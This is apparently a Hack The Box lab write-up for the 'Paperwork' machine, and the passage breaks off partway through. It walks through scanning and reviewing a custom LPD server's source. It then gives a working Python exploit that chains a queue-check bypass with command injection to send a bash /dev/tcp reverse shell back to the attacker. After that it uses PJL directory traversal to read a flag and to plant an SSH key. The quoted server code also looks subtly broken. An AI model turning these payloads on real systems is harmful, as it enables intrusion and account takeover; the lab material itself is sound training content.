---
link: https://app.hackthebox.com/machines/Paperwork?sort_by=created_at&sort_type=desc
description: Easy·Linux
release date: 2026-07-11
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1ee24ec-e2f1-4c61-88ca-9d7d4d296251-1780441937.png
solved:
solve date:
machine no.: 8
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">"Machine Name" Writeup</p></div>

  <img src="badge link" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): "htb username"</p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `ping`
    - **Description:** Sends ICMP echo-request packets and reports replies and round-trip times.
    - **Purpose:** Confirm the target host is alive and routable over the VPN tunnel before committing to a full port scan.
- `-c 4`
    - **Description:** Count — stop after sending four packets rather than pinging indefinitely.
    - **Purpose:** A quick liveness check; four packets is enough to confirm reachability and see a stable round-trip time.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ping -c 4 10.129.35.97                                          
PING 10.129.35.97 (10.129.35.97) 56(84) bytes of data.
64 bytes from 10.129.35.97: icmp_seq=1 ttl=63 time=215 ms
64 bytes from 10.129.35.97: icmp_seq=2 ttl=63 time=489 ms
64 bytes from 10.129.35.97: icmp_seq=3 ttl=63 time=215 ms
64 bytes from 10.129.35.97: icmp_seq=4 ttl=63 time=215 ms

--- 10.129.35.97 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 214.660/283.254/488.550/118.527 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.
- `| grapo`
	- **Description:** Custom shell function (defined in `~/.zshrc`) that echoes the full scan to the terminal via `tee /dev/tty`, then extracts open-port numbers and prints them as a comma-joined list.
	- **Purpose:** Produces a ready-to-copy port string (`22,80,1515`) to feed straight into the targeted deep scan, without hand-copying from the report.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.35.97 | grapo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 14:15 +0000
Warning: 10.129.35.97 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.35.97
Host is up (0.24s latency).
Not shown: 65306 closed tcp ports (reset), 226 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol

Nmap done: 1 IP address (1 host up) scanned in 49.20 seconds

22,80,1515
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ nmap -A -p 22,80,1515 10.129.35.97               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 14:29 +0000
Nmap scan report for 10.129.35.97
Host is up (0.23s latency).

PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings: 
|   TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.98%I=7%D=7/18%Time=6A5B8DDB%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   237.45 ms 10.10.14.1
2   237.82 ms 10.129.35.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.47 seconds
```

SSH is OpenSSH 10.0p2 on Ubuntu — modern, patched, not our way in. The web server on 80 is nginx 1.28.0, and notice it redirects to `http://paperwork.htb/` — that's a virtual host, so we'll need that hostname in `/etc/hosts` before the site resolves properly. The star of the show is 1515: Nmap can't fingerprint it (`ifor-protocol?` with a `?`), but it coughed up a banner — `Archive_Printer is ready and printing.` That "printer" language is the tell. This is the custom LPD service, and Nmap has no signature for it precisely because it's bespoke. That unrecognized-but-talking service is exactly where this box wants us to dig.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | Service                   | Version                                          | Analysis                                                                                                                                            |
| -------- | ------------------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH                       | OpenSSH 10.0p2 (Ubuntu 5ubuntu5.4)               | Current, fully patched. No known exploit; useful only later, once we have credentials or a written SSH key.                                         |
| 80/tcp   | HTTP                      | nginx 1.28.0 (Ubuntu)                            | Redirects to vhost `paperwork.htb`. Server itself is current; interest is in the _application_, not the nginx version. Requires `/etc/hosts` entry. |
| 1515/tcp | Custom LPD (unrecognized) | banner: `Archive_Printer is ready and printing.` | **Primary target.** Bespoke printer daemon with no Nmap signature — hand-rolled code is where logic-flaw bugs live. This is the intended foothold.  |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Service / Web Enumeration
#### 2.2.1 Virtual Host Resolution

**Command:** `echo "TARGET_IP paperwork.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

- `sudo tee -a /etc/hosts`
    - **Description:** `tee -a` appends its stdin to a file; `sudo` grants the write permission `/etc/hosts` requires.
    - **Purpose:** Map the vhost `paperwork.htb` to the target IP locally, since port 80 redirects to that hostname and won't serve content when requested by IP.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ echo "10.129.35.97 paperwork.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.35.97 paperwork.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ping -c1 paperwork.htb
PING paperwork.htb (10.129.35.97) 56(84) bytes of data.
64 bytes from paperwork.htb (10.129.35.97): icmp_seq=1 ttl=63 time=220 ms

--- paperwork.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 219.602/219.602/219.602/0.000 ms
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.2 Web Application Review — Intake Portal

**Action:** Browse to `http://paperwork.htb/` and review the Intake Portal page.

**Result:**

![[paperwork.htb.png]]

**Key finding:** The web app is not itself the target — it's documentation for the service on port 1515. It confirms three things: the protocol is **RFC 1179 (LPD)**, the queue name is **`archive_intake`**, and the backend is a **custom processor** (`paperwork-archive-v1.02`). The Usage Notice implies print jobs carry a parsed "identifier" field — a likely injection point.

|Attribute|Value|Attack implication|
|---|---|---|
|Protocol|RFC 1179 (LPD)|Port 1515 speaks the Line Printer Daemon protocol — jobs are submitted as raw LPD control/data files, not HTTP. We'll need to craft the protocol by hand.|
|Target Queue|`archive_intake`|The queue name the server validates against. Relevant if queue-name checking can be bypassed or abused.|
|Internal Processor|`paperwork-archive-v1.02`|Custom, non-standard backend. Hand-rolled parsing/execution is where logic flaws (injection, auth bypass) tend to live.|
|Identifier requirement|"valid identifier" required|Jobs carry a parsed identifier (job name). A parsed, client-controlled field is a candidate injection point.|

**Theory block — RFC 1179 / LPD:** LPD is an old printing protocol. A client connects to TCP 515 (here relocated to 1515), names a print queue, then sends two files: a _control file_ (metadata — job name, user, host) and a _data file_ (the content to print). The server parses the control file field by field. Because this is a _custom_ LPD reimplementation rather than a standard daemon, the way it parses those control-file fields — especially the job identifier — is exactly what we'll scrutinize for flaws.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.3 Source Code Acquisition

**Action:** Click on the `paperwork-archive-v1.02` link on the Intake Portal page. It downloads `paperwork-archive-v1.02.zip`, which contains the server source.

**Command:** `unzip paperwork-archive-v1.02.zip && cat server.py`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ls
paperwork-archive-v1.02.zip

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ unzip paperwork-archive-v1.02.zip 
Archive:  paperwork-archive-v1.02.zip
  inflating: server.py               

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ls
paperwork-archive-v1.02.zip  server.py

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ cat server.py  
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.4 Vulnerability Research & Analysis

Source review of `server.py` identifies two chained vulnerabilities in `handle_print_job()`.

**Vulnerability 1 — Authentication bypass via substring comparison (queue check)**

```python
queue = data[1:].decode().strip()
if queue not in VALID_QUEUE:      # VALID_QUEUE == "archive_intake"
    self.sock.send(b'\x01')
    return
```

The check uses Python's `in` (substring test) instead of `==` (equality). Because an empty string is a substring of any string, `"" in "archive_intake"` evaluates to `True`. Sending an empty queue name makes `queue not in VALID_QUEUE` false, skipping the rejection and granting access to the job handler.

|Aspect|Detail|
|---|---|
|Intended check|`queue == "archive_intake"` (exact match)|
|Actual check|`queue in "archive_intake"` (substring)|
|Bypass input|empty string (`""`) — substring of everything|
|Effect|Any client reaches the print-job handler unauthenticated|

**Vulnerability 2 — Command injection via `job_name` (shell sink)**

```python
job_name = line[1:]     # client-supplied, from the control file 'J' line
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The client-controlled `job_name` is interpolated directly into a shell command run with `shell=True`, with no sanitization. Shell metacharacters in `job_name` are interpreted by `/bin/sh`, allowing arbitrary command execution as the service user (`lp`).

**Theory block — taint tracking (source → sink):** To find injection bugs, trace attacker-controlled input (the _source_) through the program to any dangerous function (the _sink_). Here the source is `job_name` (sent by the client in the control file) and the sink is `subprocess.Popen(..., shell=True)`. With `shell=True`, Python passes the whole string to `/bin/sh`, so characters like `'`, `;`, and `#` are executed as syntax rather than treated as text. No sanitization sits between source and sink, so the input reaches the shell intact — the definition of a command-injection vulnerability. The planned payload breaks out of the `echo '...'` string with a quote, runs a command, and comments out the trailing redirect with `#`.

**Key finding:** The two flaws chain: the substring bug provides unauthenticated access to the job handler, and the `job_name` command injection provides code execution once inside. Together they yield a remote shell as `lp` with no credentials required.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access
### 3.1 Exploit Acquisition and Preparation

```python
import socket
import time

TARGET = "10.129.35.97"
PORT = 1515
ATTACKER_IP = "10.10.15.111"
ATTACKER_PORT = 4444

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))

    # 1. Command 2 (print job) + empty queue name -> bypasses the substring check
    s.send(b"\x02\n")
    time.sleep(0.2)

    # 2. Build the malicious job_name (THIS is the injection — see below)
    cmd = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'"
    job_name = f"'; {cmd}; #"

    # 3. LPD control file: the 'J' line carries the job name the server executes
    control_file = f"H attacker\nP user\nJ{job_name}\n".encode()

    # 4. Subcommand header: \x02 + "<size> cfA001attacker\n"
    header = bytes([0x02]) + f"{len(control_file)} cfA001attacker\n".encode()
    s.send(header)
    s.recv(1)  # ACK

    # 5. Send the control file body -> triggers the injected command
    s.send(control_file)

    try:
        s.recv(2)
    except socket.timeout:
        pass
    s.close()
    print("[+] Exploit sent. Check your listener!")

if __name__ == "__main__":
    main()
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Exploit Execution — Foothold as `lp`

**Command (attacker, terminal 1):** `python3 foothold.py`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ python3 foothold.py 
[+] Exploit sent. Check your listener!
```

**Command (attacker, terminal 2):** `nc -lvnp 4444`

**Breakdown:**

- `nc -lvnp 4444`
    - **Description:** Netcat listener — `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p 4444` bind port.
    - **Purpose:** Catch the reverse shell the injected `bash -i >& /dev/tcp/...` payload connects back with.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.10.15.111] from (UNKNOWN) [10.129.35.97] 36114
bash: cannot set terminal process group (983): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$ 
```

**Payload (the injected `job_name`):**

```python
job_name = "'; bash -c 'bash -i >& /dev/tcp/10.10.15.111/4444 0>&1'; #"
```

When interpolated into `echo 'Archive: {job_name}' >> /tmp/archive.log`, the leading `'` closes the server's `echo` string, `;` separates statements, `bash -c '...'` spawns the reverse shell, and `#` comments out the trailing redirect — producing three valid shell statements.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Initial Enumeration as `lp`

**Command:** `id` and directory listing of `/home`

```shell
lp@paperwork:/opt/LPDServer$ id
id
uid=7(lp) gid=7(lp) groups=7(lp)
lp@paperwork:/opt/LPDServer$ ls /home
ls /home
archivist
lp@paperwork:/opt/LPDServer$ ls /home/archivist
ls /home/archivist
ls: cannot open directory '/home/archivist': Permission denied
```

The shell runs as the unprivileged **`lp`** service account (uid 7), with no supplementary groups. The only interactive user on the box is **`archivist`**, whose home directory — and therefore `user.txt` — is not readable by `lp`. Lateral movement to `archivist` is the next objective; it will require an internal service rather than filesystem access.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement — `lp` → `archivist`
### ##### 4.1 Internal Service Discovery

**Command:** `ss -tlnp`

**Breakdown:**

- `ss`
    - **Description:** Socket statistics utility; lists network sockets.
    - **Purpose:** Reveal services listening only on localhost — internal ports invisible to the external Nmap scan — to find a pivot toward `archivist`.
- `-tlnp`
    - **Description:** `-t` TCP, `-l` listening sockets only, `-n` numeric ports (no name resolution), `-p` show owning process.
    - **Purpose:** Enumerate exactly which internal TCP ports are open and, where permitted, which process owns them.

**Result:**

```shell
lp@paperwork:/opt/LPDServer$ ss -tlnp
ss -tlnp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                          
LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*                                    
LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                    
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                    
LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*                                    
LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*                                    
LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=983,fd=3))
LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*                                    
LISTEN 0      4096            [::]:22           [::]:*                                    
```

**Key finding:** Two services listen only on `127.0.0.1` and were therefore invisible externally: port **1337** and port **9100**. Port **9100** is the standard HP JetDirect port (PJL) and is the intended pivot to `archivist`. Port **1337** is a **red herring** — it does not lead to `archivist` and should be disregarded.

|Port|Bind|Service|Analysis|
|---|---|---|---|
|22|`0.0.0.0`|SSH|External, known. Usable only once we obtain a key/credential.|
|80|`0.0.0.0`|HTTP (nginx)|External, already enumerated (Intake Portal).|
|1515|`0.0.0.0`|Custom LPD (pid 983)|Our foothold service.|
|53|`127.0.0.53/54`|systemd-resolved|Local DNS stub. Not a target.|
|**9100**|`127.0.0.1`|**HP JetDirect / PJL**|**Pivot to `archivist`.** Internal-only; abuses PJL file operations (traversal read/write) for lateral movement.|
|1337|`127.0.0.1`|unknown|**Red herring.** Internal debug/unrelated service; does not lead to `archivist`. Deliberately ignored.|

**Theory block — port 9100 / JetDirect / PJL:** TCP 9100 is the raw printing port used by HP JetDirect. Data sent to it is interpreted as PJL (Printer Job Language), a control language that includes file-system commands (`FSUPLOAD`, `FSDOWNLOAD`, `FSQUERY`). On a hardened real printer these stay inside the printer's own storage, but a vulnerable or custom implementation can be coerced into directory traversal — reading and writing arbitrary files on the host OS. Because the service listens only on localhost, it is reachable only after obtaining the `lp` foothold, making it a classic internal pivot.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Confirm JetDirect Reachability

**Command:** `python3 -c 'import socket; s=socket.socket(); s.connect(("127.0.0.1",9100)); print("[+] Connected"); s.close()'`

**Breakdown:**

- `python3 -c '...'`
    - **Description:** Executes an inline Python script that opens a TCP socket to `127.0.0.1:9100`.
    - **Purpose:** Verify the internal JetDirect service is reachable from the `lp` shell. Netcat is not installed on the target, so Python is used as the connectivity tester.

**Result:**

```shell
lp@paperwork:/opt/LPDServer$ python3 -c 'import socket; s=socket.socket(); s.connect(("127.0.0.1",9100)); print("[+] Connected"); s.close()'
<7.0.0.1",9100)); print("[+] Connected"); s.close()'
[+] Connected
lp@paperwork:/opt/LPDServer$ 
```

**Key finding:** The JetDirect/PJL service on `127.0.0.1:9100` accepts connections from the `lp` context, confirming it as a viable pivot toward `archivist`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Read `user.txt` via PJL Directory Traversal (FSUPLOAD)

**Command:**

```python
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
payload = b'@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\n'
s.send(payload)
data = s.recv(4096)
print(data.decode(errors='ignore'))
s.close()
"
```

**Breakdown:**

- `@PJL FSUPLOAD NAME="..."`
    - **Description:** PJL file-system command that reads ("uploads") a file from the printer's storage back to the client.
    - **Purpose:** Retrieve a file's contents through the JetDirect service, using the daemon's own file-access privileges rather than the `lp` user's.
- `../../../../`
    - **Description:** Sequence of parent-directory references prepended to the path.
    - **Purpose:** Escape the printer's virtual filesystem root and traverse into the real host filesystem, reaching `/home/archivist/user.txt` — a file `lp` cannot read directly.

**Result:**

```shell
@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt" SIZE=33
258e58dd504a4d54beb86f188ee362e8
```

**Key finding — USER FLAG captured via directory traversal:** The PJL implementation fails to constrain `FSUPLOAD` paths, allowing arbitrary host-file reads. The service reads with higher privilege than `lp`, exposing `archivist`'s `user.txt`.

**USER FLAG:** `258e58dd504a4d54beb86f188ee362e8`

**Theory block — PJL directory traversal:** PJL file commands are meant to operate inside the printer's own storage namespace. A hardened implementation resolves and confines every `NAME=` path to that root. This custom service concatenates the client path onto its base without canonicalizing it, so a `../` chain walks up past the intended root into the host's real directory tree. It's the printer-protocol equivalent of classic web path traversal (`GET /../../etc/passwd`) — same flaw, different protocol.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Escalate PJL Traversal to Interactive Access (Write SSH Key)

#### 4.4.1 Generate SSH Keypair (attacker, local)

**Command:** `ssh-keygen -t rsa -f archivist_key -N ""`

**Breakdown:**

- `ssh-keygen`
    - **Description:** Generates an SSH authentication keypair.
    - **Purpose:** Produce a dedicated key to plant on the target, giving us a login credential for `archivist`.
- `-t rsa`
    - **Description:** Key type — RSA.
    - **Purpose:** Broadly compatible key type accepted by the target's OpenSSH.
- `-f archivist_key`
    - **Description:** Output filename for the private key (public key gets `.pub` appended).
    - **Purpose:** Keep this engagement key separate from any personal keys.
- `-N ""`
    - **Description:** Sets an empty passphrase.
    - **Purpose:** Allow non-interactive login (no passphrase prompt) when SSHing in as `archivist`.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ ssh-keygen -t rsa -f archivist_key -N ""
Generating public/private rsa key pair.
Your identification has been saved in archivist_key
Your public key has been saved in archivist_key.pub
The key fingerprint is:
SHA256:InA9/3UOPCgH2fdDoY7BqS70S1zG8Rm5eNF/zLHH2cA kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|              .  |
|     .   + . = . |
|  . . o o * * E. |
|   o   o + @ B *=|
|    . o S O @ +oO|
|     o = * o = .o|
|      . = .   .  |
|       o .       |
|        .        |
+----[SHA256]-----+

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
└─$ cat archivist_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6Sl+sL5XXpDOykwIDqU/m8iadBIKwZfbqI/KdSxb9A9aMQzXXBtw0J7cApXJju7ypzoHx4FL4NzMVn2jB7Mrm/ZV6SMkzFUiLK9oP2xF9jG/TO28HdhLkbkB8Zs5toKBttTnPG4dkUqufU2ekhG77gCJ0Nbf8LwOBqAMFClEbl4/4hj5yLZp3C/I/TVf7Cl3o/QCpgBRPDbj9hkhADZlxGQpn6by5lFL/EA6JD+fc4CAJl7rfUusFUPKsmTslfueTO6lSLXy4DFHE2f9hfE2ixw3MEc3uk0Hz22Ti4QI5qCurFxJIAyT5jBRneqmr4tHAMZS6dbTE4aLSj0cHrYrgVX9vdGKdUjVjHIAwaH4Lm6BdE6/bY+HiDlQ+cP1pQVFxXKFcxYFRDA4kI0Lg5UcYo2WtjEL7s12phCvbgCxPDbiXuOvXIc1z354u9IXFQAR+8JnqKu9arLB4AgltJ3Cp1yxJwBwjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali
```

Keypair created: `archivist_key` (private) and `archivist_key.pub` (public). The public key is what we write to the target.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 4.4.2 Write the Public Key via PJL FSDOWNLOAD (in the `lp` shell)

**Command:**

```python
python3 -c "
import socket
key = b'ssh-rsa AAAAB3NzaC1yc2E...wjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
header = b'@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=%d\n' % len(key)
s.send(header)
s.send(key)
s.close()
print('[+] Key written')
"
```

**Breakdown:**

- `@PJL FSDOWNLOAD FORMAT:BINARY NAME="..." SIZE=<n>`
    - **Description:** PJL command that writes ("downloads") a file _into_ the printer's storage; `FORMAT:BINARY` sends raw bytes, `SIZE` declares the byte count that follows.
    - **Purpose:** Turn the traversal primitive from read to write, planting an attacker-controlled file on the host.
- `../../../../home/archivist/.ssh/authorized_keys`
    - **Description:** Traversal path escaping the printer root, targeting `archivist`'s SSH `authorized_keys`.
    - **Purpose:** Install our public key as a trusted login credential for `archivist`, converting file-write into interactive access.

**Result:**

```shell
lp@paperwork:/opt/LPDServer$ python3 -c "
import socket
key = b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6Sl+sL5XXpDOykwIDqU/m8iadBIKwZfbqI/KdSxb9A9aMQzXXBtw0J7cApXJju7ypzoHx4FL4NzMVn2jB7Mrm/ZV6SMkzFUiLK9oP2xF9jG/TO28HdhLkbkB8Zs5toKBttTnPG4dkUqufU2ekhG77gCJ0Nbf8LwOBqAMFClEbl4/4hj5yLZp3C/I/TVf7Cl3o/QCpgBRPDbj9hkhADZlxGQpn6by5lFL/EA6JD+fc4CAJl7rfUusFUPKsmTslfueTO6lSLXy4DFHE2f9hfE2ixw3MEc3uk0Hz22Ti4QI5qCurFxJIAyT5jBRneqmr4tHAMZS6dbTE4aLSj0cHrYrgVX9vdGKdUjVjHIAwaH4Lm6BdE6/bY+HiDlQ+cP1pQVFxXKFcxYFRDA4kI0Lg5UcYo2WtjEL7s12phCvbgCxPDbiXuOvXIc1z354u9IXFQAR+8JnqKu9arLB4AgltJ3Cp1yxJwBwjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
